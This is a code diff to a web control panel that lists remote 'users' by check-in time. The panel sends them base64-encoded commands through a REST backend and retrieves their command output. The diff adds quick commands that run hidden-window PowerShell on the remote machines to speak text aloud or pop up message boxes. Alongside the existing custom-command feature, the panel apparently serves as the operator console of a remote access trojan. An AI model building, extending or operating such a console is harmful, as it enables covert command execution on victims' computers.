@@ -21,7 +21,6 @@
             font-family: monospace;
             user-select: none;
             padding: 1rem;
-
             min-height: 100vh;
         }
 
@@ -29,29 +28,44 @@
             position: fixed;
             background-color: #222;
             border: 1px solid #555;
-            z-index: 1;
-            min-width: 180px;
+            z-index: 100;
+            min-width: 200px;
             box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.5);
         }
 
         .context-menu-item {
-            padding: 6px 12px;
+            padding: 8px 12px;
             cursor: pointer;
             transition: background 0.2s;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            font-size: 13px;
         }
 
         .context-menu-item:hover {
-            background: #555;
+            background: #444;
+        }
+
+        .divider {
+            border-top: 1px solid #444;
+            margin: 4px 0;
+        }
+
+        .hint {
+            color: #888;
+            font-size: 0.85em;
+            padding: 1px 5px;
+            background-color: #333;
+            border-radius: 3px;
+            margin-left: 10px;
         }
     </style>
 </head>
 
 <body x-data="app()" x-init="fetchData(); setInterval(() => fetchData(), 4000)" @contextmenu.prevent
-    @keydown.window.c="if(targetUser) fetchSingle(targetUser)"
-    @keydown.window.v="if(targetUser) viewOutput(targetUser)">
+    @keydown.window.c="if(targetUser) fetchSingle(targetUser)" @keydown.window.v="if(targetUser) viewOutput(targetUser)"
+    @keydown.window.s="if(targetUser) quickCommand('speak')" @keydown.window.a="if(targetUser) quickCommand('popup')">
 
     <div x-show="!selected">
         <template x-for="user in rows" :key="user.username">
@@ -69,15 +83,19 @@
     <div x-show="showMenu" class="context-menu" :style="`top: ${menuPos.y}px; left: ${menuPos.x}px;`" x-transition
         @click.away="showMenu = false">
         <div class="context-menu-item" @click="fetchSingle(targetUser); showMenu = false">
-            <span>Send Command</span>
-            <span
-                style="color: #888; font-size: 0.9em; padding: 1px 5px; background-color: #444; border-radius: 3px;">C</span>
+            <span>Send Custom</span> <span class="hint">C</span>
         </div>
         <div class="context-menu-item" @click="viewOutput(targetUser); showMenu = false">
-            <span>View Output</span>
-            <span
-                style="color: #888; font-size: 0.9em; padding: 1px 5px; background-color: #444; border-radius: 3px;">V</span>
+            <span>View Output</span> <span class="hint">V</span>
+        </div>
 
+        <div class="divider"></div>
+
+        <div class="context-menu-item" @click="quickCommand('speak')">
+            <span>Voice Chat</span> <span class="hint">S</span>
+        </div>
+        <div class="context-menu-item" @click="quickCommand('popup')">
+            <span>Alert Box</span> <span class="hint">A</span>
         </div>
     </div>
 
@@ -99,41 +117,48 @@
                     this.showMenu = true;
                 },
 
+                quickCommand(type) {
+                    const user = this.targetUser;
+                    this.showMenu = false;
+                    if (this.getStatusColor(user) !== 'green') return;
+
+                    let msg = prompt(`Enter message for ${user.username}:`);
+                    if (!msg) return;
+
+                    msg = msg.replace(/'/g, "''");
+
+                    let rawCmd = "";
+                    if (type === 'speak') {
+                        rawCmd = `powershell -W H -C "(New-Object -Com SAPI.SpVoice).Speak('${msg}')"`;
+                    } else if (type === 'popup') {
+                        rawCmd = `powershell -W H -C "(New-Object -Com WScript.Shell).Popup('${msg}')"`;
+                    }
+
+                    this.sendCommand(user.username, btoa(rawCmd));
+                },
+
                 async fetchData() {
                     try {
                         const response = await fetch(`${this.url}?select=username,updated_at&order=updated_at.desc`, {
-                            headers: {
-                                'apikey': this.apiKey,
-                                'Authorization': `Bearer ${this.apiKey}`
-                            }
+                            headers: { 'apikey': this.apiKey, 'Authorization': `Bearer ${this.apiKey}` }
                         });
                         this.rows = await response.json();
-                    } catch (err) {
-                        console.error(err);
-                    }
+                    } catch (err) { console.error(err); }
                 },
 
                 async viewOutput(user) {
                     this.showMenu = false;
                     try {
                         const response = await fetch(`${this.url}?select=out&username=eq.${user.username}`, {
-                            headers: {
-                                'apikey': this.apiKey,
-                                'Authorization': `Bearer ${this.apiKey}`
-                            }
+                            headers: { 'apikey': this.apiKey, 'Authorization': `Bearer ${this.apiKey}` }
                         });
                         const data = await response.json();
-
-                        if (data[0] && data[0].out) {
+                        if (data[0]?.out) {
                             const decoded = atob(data[0].out);
                             await navigator.clipboard.writeText(decoded);
-                            alert(`Output for ${user.username} (Copied from clipboard):\n\n${decoded}`);
-                        } else {
-                            alert(`No output found for ${user.username}`);
+                            alert(`Output for ${user.username}:\n\n${decoded}`);
                         }
-                    } catch (err) {
-                        console.error(err);
-                    }
+                    } catch (err) { console.error(err); }
                 },
 
                 getStatusColor(user) {
